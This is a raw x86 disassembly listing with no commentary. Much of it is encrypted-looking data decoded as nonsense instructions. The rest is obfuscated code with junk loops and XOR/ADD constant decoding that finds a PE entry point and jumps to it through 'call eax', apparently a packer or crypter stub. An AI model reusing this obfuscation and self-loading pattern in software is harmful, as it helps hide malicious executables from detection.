  40614c:	ins    BYTE PTR es:[edi],dx
  40614d:	adc    al,BYTE PTR ds:0x1d0ad7d
  406153:	inc    eax
  406154:	sti    
  406155:	cvtpi2ps xmm4,mm2
  406158:	mov    esp,0x2403acb5
  40615d:	test   al,0xad
  40615f:	sbb    ah,bl
  406161:	leave  
  406162:	pushf  
  406163:	prefetch (bad)
  406164:	or     eax,0x2ec3c2dc
  406169:	out    0x3f,al
  40616b:	add    cl,ah
  40616d:	mov    al,ds:0x1e449bbd
  406172:	cli    
  406173:	mov    al,0xf3
  406175:	jns    0x4061f4
  406177:	jle    0x4061bb
  406179:	jmp    0x5aedf40f
  40617e:	push   0xffffffc7
  406180:	scas   al,BYTE PTR es:[edi]
  406181:	xor    esi,eax
  406183:	xchg   esi,eax
  406184:	dec    esi
  406185:	and    DWORD PTR [ebp-0xbebd7e8],esp
  40618b:	pop    esi
  40618c:	push   ebx
  40618d:	jb     0x406168
  40618f:	mov    al,0x31
  406191:	add    edi,DWORD PTR [ecx-0x78]
  406194:	sahf   
  406195:	sbb    DWORD PTR [ebx-0x11b06c70],esi
  40619b:	push   ebp
  40619c:	mov    ecx,ebx
  40619e:	call   0x893204cf
  4061a3:	push   ss
  4061a4:	xor    bh,bh
  4061a6:	mov    eax,0x7170f29f
  4061ab:	cdq    
  4061ac:	jmp    0xed4a60f5
  4061b1:	sub    bl,0xd9
  4061b4:	push   cs
  4061b5:	fst    QWORD PTR [esi+0x6]
  4061b8:	out    0x2f,eax
  4061ba:	cld    
  4061bb:	rol    DWORD PTR [edi+esi*8],0x75
  4061bf:	shr    bh,1
  4061c1:	xor    al,0x32
  4061c3:	dec    ecx
  4061c4:	push   edx
  4061c5:	pop    ss
  4061c6:	popf   
  4061c7:	outs   dx,BYTE PTR ds:[esi]
  4061c8:	jl     0x4061bc
  4061ca:	(bad)  
  4061cb:	push   ds
  4061cc:	xchg   esi,eax
  4061cd:	daa    
  4061ce:	jae    0x406192
  4061d0:	pop    ecx
  4061d1:	inc    edx
  4061d2:	leave  
  4061d3:	enter  0x1c8b,0x5d
  4061d7:	jae    0x406186
  4061d9:	push   esp
  4061da:	jo     0x406222
  4061dc:	push   cs
  4061dd:	cdq    
  4061de:	adc    eax,0x4797ebe7
  4061e3:	jg     0x406221
  4061e5:	out    0x95,eax
  4061e7:	dec    edi
  4061e8:	in     al,dx
  4061e9:	fsubr  DWORD PTR [edx-0x6ada7547]
  4061ef:	push   esp
  4061f0:	push   cs
  4061f1:	mov    ds:0x9e340f17,al
  4061f6:	cdq    
  4061f7:	push   ebp
  4061f8:	push   eax
  4061f9:	(bad)  
  4061fa:	repnz fs and bh,bl
  4061fe:	div    BYTE PTR [ebp+0x3ca1b743]
  406204:	mov    edx,0xdb6946ea
  406209:	mov    ch,0xb3
  40620b:	out    dx,al
  40620c:	xchg   esp,eax
  40620e:	sub    al,0x29
  406210:	pop    esi
  406211:	pop    ss
  406212:	in     al,0x82
  406214:	jns    0x406292
  406216:	scas   al,BYTE PTR es:[edi]
  406217:	out    0xb5,al
  406219:	add    eax,0x3ebefaba
  40621e:	push   0x4000c342
  406223:	sub    DWORD PTR [esi],edx
  406225:	retf   0xf512
  406228:	mov    cl,0xec
  40622a:	loope  0x40625d
  40622c:	or     eax,0x830f25c9
  406231:	sti    
  406232:	sub    eax,0x9213d5fd
  406237:	scas   eax,DWORD PTR es:[edi]
  406238:	sti    
  406239:	cmp    al,dl
  40623b:	es adc eax,0x7f5f2d68
  406241:	nop
  406242:	bound  ebp,QWORD PTR [ecx]
  406244:	jb     0x406281
  406246:	ret    0xa19b
  406249:	in     eax,0x67
  40624b:	ins    BYTE PTR es:[edi],dx
  40624c:	out    0x2,al
  40624e:	xchg   esi,eax
  40624f:	scas   eax,DWORD PTR es:[edi]
  406250:	popa   
  406251:	lea    ecx,[ebp+ebp*8+0x15]
  406255:	mov    ds:0x52ae1ad4,al
  40625a:	cmp    eax,edx
  40625c:	mov    edx,0x6508ef11
  406261:	stos   DWORD PTR es:[edi],eax
  406262:	rol    BYTE PTR [ebx+esi*1-0x10],cl
  406266:	and    DWORD PTR ds:0x4337a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4337a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4337a3,ecx
  406282:	cmp    DWORD PTR ds:0x4337a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4337a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4337a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4337a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4337a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	pop    ds
  406312:	mov    ebx,0x3f54d6d6
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	daa    
  40631e:	(bad)  
  40631f:	jecxz  0x406359
  406321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406322:	pop    edx
  406323:	ror    DWORD PTR gs:[ebx+0x6199d362],1
  40632a:	aam    0xe
  40632c:	out    dx,al
  40632d:	dec    esp
  40632e:	scas   eax,DWORD PTR es:[edi]
  40632f:	popa   
  406330:	sahf   
  406331:	and    bl,BYTE PTR ds:0x843e22eb
  406337:	daa    
  406338:	jmp    0xc2924032
  40633d:	push   ebx
  40633e:	inc    ecx
  40633f:	jmp    0x8501dda2
  406344:	jnp    0x406371
  406346:	jns    0x4062e2
  406348:	dec    ecx
  406349:	aas    
  40634a:	xchg   esi,eax
  40634b:	mov    ebp,0x7ed1b8e6
  406350:	cs mov dl,0x9e
  406353:	add    al,0x62
  406355:	je     0x4063a1
  406357:	enter  0x3ed,0xa6
  40635b:	sub    eax,0xa5b22607
  406360:	mov    BYTE PTR [edx],dl
  406362:	inc    edi
  406363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406364:	xchg   esp,eax
  406365:	cld    
  406366:	dec    ebx
  406367:	dec    ebx
  406368:	fisub  WORD PTR [esi-0x21]
  40636b:	jmp    0xeacc9d56
  406370:	inc    edi
  406371:	std    
  406372:	push   ebx
  406373:	rol    eax,cl
  406375:	push   ds
  406376:	shl    DWORD PTR [ecx],0x4
  406379:	sub    BYTE PTR [esi+0xd],dl
  40637c:	xchg   ebx,eax
  40637d:	and    DWORD PTR [edx+ebx*2-0x6587b679],0x7a
  406385:	dec    ebp
  406386:	mov    bl,0x1b
  406388:	stos   BYTE PTR es:[edi],al
  406389:	push   es
  40638a:	pop    esp
  40638b:	icebp  
  40638c:	and    ebp,DWORD PTR [ecx+ebp*8]
  40638f:	dec    edx
  406390:	cmp    eax,0x991bef57
  406395:	pop    ecx
  406396:	shl    DWORD PTR [ebx+edi*1-0x116484b1],cl
  40639d:	xor    edx,DWORD PTR [edi+edx*1]
  4063a0:	and    BYTE PTR [edi-0x14],0x75
  4063a4:	iret   
  4063a5:	dec    edi
  4063a6:	ror    BYTE PTR [ebx],1
  4063a8:	aas    
  4063a9:	push   edx
  4063aa:	xchg   BYTE PTR [eax+0xb],dh
  4063ad:	sbb    dl,BYTE PTR [ecx+ebx*1+0x1c]
  4063b1:	adc    al,0x98
  4063b3:	pop    es
  4063b4:	jmp    0xcde2:0xf160f83b
  4063bb:	xchg   edx,eax
  4063bc:	stos   BYTE PTR es:[edi],al
  4063bd:	ffree  st(2)
  4063bf:	call   0x8384:0xcf92efbb
  4063c6:	mov    ecx,0xe97af73b
  4063cb:	mov    bl,0xca
  4063cd:	imul   esi,DWORD PTR [ebx],0xdbedc030
  4063d3:	and    al,0x4d
  4063d5:	inc    ebx
  4063d6:	xor    edx,ecx
  4063d8:	jae    0x406408
  4063da:	pop    ecx
  4063db:	loop   0x406388
  4063dd:	sbb    al,0x3a
  4063df:	ficomp DWORD PTR es:[ebx+esi*2-0x2fc73aa3]
  4063e7:	ins    DWORD PTR es:[edi],dx
  4063e8:	inc    esp
  4063e9:	mov    DWORD PTR [ebx],eax
  4063eb:	adc    BYTE PTR ds:0x80bdf0a7,bh
  4063f1:	sub    dh,bh
  4063f3:	mov    ecx,0x116760ac
  4063f8:	dec    edx
  4063f9:	test   al,0x78
  4063fb:	loope  0x4063df
  4063fd:	xor    al,0x2f
  4063ff:	cwde   
  406400:	shl    BYTE PTR ds:0x4e2ce068,1
  406406:	push   ss
  406407:	add    bl,BYTE PTR [ebx-0x7e]
  40640a:	add    DWORD PTR [eax+0x765836de],ebx
  406410:	pop    ebx
  406411:	sbb    al,0x14
  406413:	adc    BYTE PTR [edx*1+0x1e0f127],dh
  40641a:	xchg   ecx,eax
  40641b:	or     al,0x2b
  40641d:	repz mov eax,ds:0x9e91a75f
  406423:	out    0x4b,al
  406425:	adc    DWORD PTR [ebx+0x38],ebp
  406428:	pop    eax
  406429:	inc    esp
  40642a:	femms  
  40642c:	push   ebx
  40642d:	rcl    DWORD PTR [edi+0x23436841],cl
  406433:	lods   al,BYTE PTR ds:[esi]
  406434:	xchg   DWORD PTR [edi-0x7a422360],esp
  40643a:	mov    ebx,0xd9e735a6
  40643f:	sub    edi,DWORD PTR [edi-0x63e05217]
  406445:	fmul   DWORD PTR [ebx+edi*4+0x6d]
  406449:	sbb    al,0xb
  40644b:	dec    edi
  40644c:	dec    ebx
  40644d:	pusha  
  40644e:	in     al,dx
  40644f:	sub    BYTE PTR [edi+edi*4+0x2299d5fe],bh
  406456:	mov    fs,ebp
  406458:	js     0x40646f
  40645a:	inc    edi
  40645b:	inc    edx
  40645c:	call   0x6b19:0xb450cb2
  406463:	push   esp
  406464:	fidiv  WORD PTR [edx]
  406466:	out    0x80,al
  406468:	psllw  mm6,QWORD PTR [ecx]
  40646b:	or     BYTE PTR [edi+0x6a],cl
  40646e:	fsubr  DWORD PTR [esi]
  406470:	sbb    BYTE PTR [ebx+edi*2-0x1c],cl
  406474:	pcmpeqw mm7,QWORD PTR [ecx+0x3c]
  406478:	mov    BYTE PTR cs:[eax],al
  40647b:	dec    ebx
  40647c:	xchg   esi,eax
  40647d:	fcomi  st,st(4)
  40647f:	fldcw  WORD PTR [eax]
  406481:	stos   BYTE PTR es:[edi],al
  406482:	cwde   
  406483:	dec    edi
  406484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406485:	sbb    BYTE PTR [ebx-0x19],bh
  406488:	stc    
  406489:	rcl    al,0x85
  40648c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648d:	cld    
  40648e:	sbb    eax,0x18626b41
  406493:	jge    0x406439
  406495:	imul   ebp,DWORD PTR [eax-0x4cc29716],0x9bf5ec81
  40649f:	fnstenv [esi-0x42]
  4064a2:	sahf   
  4064a3:	fist   WORD PTR [ecx]
  4064a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a6:	mov    al,cl
  4064a8:	es mov fs,esi
  4064ab:	mul    DWORD PTR [ebx]
  4064ad:	(bad)  
  4064af:	push   es
  4064b0:	call   0x3abc367b
  4064b5:	pop    ecx
  4064b6:	adc    al,0xd2
  4064b8:	cwde   
  4064b9:	add    DWORD PTR [edx+0x1906e646],esi
  4064bf:	sbb    eax,0x865d12af
  4064c4:	jbe    0x406493
  4064c6:	rol    esi,0x5b
  4064c9:	lock or ecx,DWORD PTR [eax+ebp*8-0x7b]
  4064ce:	je     0x40650e
  4064d0:	rol    al,cl
  4064d2:	xchg   edx,eax
  4064d3:	sub    eax,0x3ca6a2
  4064d8:	xchg   esi,eax
  4064d9:	ja     0x4064e6
  4064db:	pop    ebx
  4064dc:	push   cx
  4064de:	xor    cl,BYTE PTR [edx]
  4064e0:	lods   eax,DWORD PTR ds:[esi]
  4064e1:	enter  0x6b44,0x31
  4064e5:	jno    0x4064d0
  4064e7:	in     eax,dx
  4064e8:	cld    
  4064e9:	dec    ebp
  4064ea:	pop    eax
  4064eb:	inc    esp
  4064ec:	jmp    0xf3cd:0xc8941b14
  4064f3:	jbe    0x406541
  4064f5:	mov    ah,0xde
  4064f7:	rcr    BYTE PTR [esi+eax*1+0x24c47429],cl
  4064fe:	pop    esp
  4064ff:	das    
  406500:	xchg   ebx,eax
  406501:	mov    esi,0xa17dbbc7
  406506:	popf   
  406507:	jg     0x40656e
  406509:	inc    esi
  40650a:	rcl    BYTE PTR [edi+0x40342e13],1
  406510:	jmp    0x4bb126f4
  406515:	gs mov dh,0x19
  406518:	(bad)  
  406519:	fnstenv [edi-0x501908fc]
  40651f:	xor    edi,ebp
  406521:	jge    0x406546
  406523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406524:	sub    BYTE PTR [edx],0xe2
  406527:	imul   BYTE PTR [edi+0x6c]
  40652a:	test   DWORD PTR [ecx],ebx
  40652c:	imul   eax,DWORD PTR [edi-0x36b18688],0x48a18e4b
  406536:	lahf   
  406537:	fisttp WORD PTR [edi+0x680e144e]
  40653d:	pop    edx
  40653e:	addr16 mov ah,0xf7
  406541:	add    ah,BYTE PTR [eax+0x41]
  406544:	retf   0x19a2
  406547:	fcom   DWORD PTR [ebp+ebx*4-0x7]
  40654b:	out    dx,eax
  40654c:	test   BYTE PTR [edi+0x4d5b3c],dh
  406552:	jecxz  0x406535
  406554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406555:	and    DWORD PTR [eax+0x4efab43e],ebx
  40655b:	mov    eax,0x21324d3
  406560:	add    BYTE PTR [edx-0x62],ah
  406563:	jg     0x4064fd
  406565:	mov    DWORD PTR [ecx-0x51],ebx
  406568:	push   esp
  406569:	out    dx,al
  40656a:	dec    esi
  40656b:	fidivr WORD PTR gs:[eax+0x0]
  40656f:	mov    esi,0xb8db991
  406574:	add    bh,BYTE PTR [ebx-0x45]
  406577:	in     al,0xba
  406579:	and    ebp,edi
  40657b:	dec    ecx
  40657c:	retf   0xe231
  40657f:	jge    0x4065c2
  406581:	icebp  
  406582:	cmp    ebp,DWORD PTR [esi]
  406584:	popa   
  406585:	loope  0x4065bb
  406587:	dec    ebx
  406588:	push   edx
  406589:	add    ah,dh
  40658b:	lahf   
  40658c:	shl    ah,0x89
  40658f:	rcl    ebx,0x60
  406592:	ss pusha 
  406594:	(bad)  
  406595:	xlat   BYTE PTR ds:[ebx]
  406596:	dec    edx
  406597:	push   edi
  406598:	call   0x9e17:0x1ce3a64d
  40659f:	mov    esp,0x74fb5f37
  4065a4:	outs   dx,BYTE PTR ds:[esi]
  4065a5:	sbb    eax,0x993e8351
  4065aa:	mov    esp,0x6d720add
  4065af:	popf   
  4065b0:	xor    eax,0x8b140d79
  4065b5:	and    eax,0x3f8b1a72
  4065ba:	xor    cl,al
  4065bc:	jae    0x40657e
  4065be:	mov    DWORD PTR [eax-0x412dd04b],ebp
  4065c4:	sahf   
  4065c5:	mov    ah,0xdb
  4065c7:	or     ebp,DWORD PTR [esi+0x38]
  4065ca:	fsubr  DWORD PTR ds:0xe22b1340
  4065d0:	ins    BYTE PTR es:[edi],dx
  4065d1:	xchg   BYTE PTR [esi-0x60],dl
  4065d4:	cld    
  4065d5:	loop   0x406565
  4065d7:	(bad)  
  4065d8:	jnp    0x40661e
  4065da:	mov    edi,0xa0c4bbc
  4065df:	cmp    al,0x97
  4065e1:	repnz sub BYTE PTR [edi],al
  4065e4:	shr    DWORD PTR [eax+0x18],1
  4065e7:	ins    DWORD PTR es:[edi],dx
  4065e8:	lods   eax,DWORD PTR ds:[esi]
  4065e9:	or     esi,DWORD PTR [ecx+0x4d]
  4065ec:	test   BYTE PTR [esi+edx*4-0x6ebdd09d],ch
  4065f3:	mov    ah,0xc9
  4065f5:	sbb    eax,0xb58df7cb
  4065fa:	scas   eax,DWORD PTR es:[edi]
  4065fb:	pop    edi
  4065fc:	imul   BYTE PTR [esi+0x60]
  4065ff:	push   edx
  406600:	aad    0x34
  406602:	sar    ebp,0x8f
  406605:	imul   eax,edx,0x27
  406608:	(bad)  
  40660a:	or     bl,BYTE PTR [eax+0x77b0ea9b]
  406610:	dec    esi
  406611:	push   cs
  406612:	inc    ecx
  406613:	cdq    
  406614:	sub    al,0xce
  406616:	and    al,0x16
  406618:	fwait
  406619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40661a:	and    al,0x95
  40661c:	cmpps  xmm7,XMMWORD PTR [ebp-0x510e1e68],0xa9
  406624:	retf   
  406625:	dec    esi
  406626:	jle    0x406659
  406628:	or     ebp,DWORD PTR ds:0xa84f2bea
  40662e:	sub    eax,0xa2e6b433
  406633:	sub    ebp,DWORD PTR [ecx]
  406635:	in     al,0x46
  406637:	mov    eax,0x581b6814
  40663c:	cmp    eax,0xb993691b
  406641:	fldcw  WORD PTR [esi+0x5f7012fc]
  406647:	jge    0x40668c
  406649:	ins    BYTE PTR es:[edi],dx
  40664a:	mov    fs,WORD PTR [eax]
  40664c:	xor    eax,DWORD PTR [edx+esi*4]
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43367b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433753,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433727,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433763,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433763
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433763,ecx
  4066d8:	cmp    DWORD PTR ds:0x433763,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433883
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433763,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433763
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433763,ecx
  406714:	cmp    DWORD PTR ds:0x433763,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433757
  406728:	and    ecx,DWORD PTR ds:0x43368f
  40672e:	mov    DWORD PTR ds:0x433757,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43369b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4337ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433693,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4336eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433687,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433687
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433687,ebx
  40677d:	cmp    DWORD PTR ds:0x433687,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433687,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4338b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43372b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433717,0x433727
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433753
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4336eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433693,0x43371f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433687,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43372f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433763
  40683c:	and    DWORD PTR ds:0x433727,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4337ab
  40684d:	or     DWORD PTR ds:0x433763,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4336db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43379f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43372b
  406870:	sub    DWORD PTR ds:0x433753,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43368b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433687,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433693,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43368f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4336a3,0x4337ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43371b,0x43375f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433767,0x433713
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4336d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4336db,0x43376f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43372b,0x4336ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4336db,0x43371b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43367b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43367b,0x4336a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43375b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43367f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43376f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43379b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43379b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43379b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43379b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43379b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433717
  4069db:	adc    ecx,DWORD PTR ds:0x4336df
  4069e1:	mov    DWORD PTR ds:0x433717,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
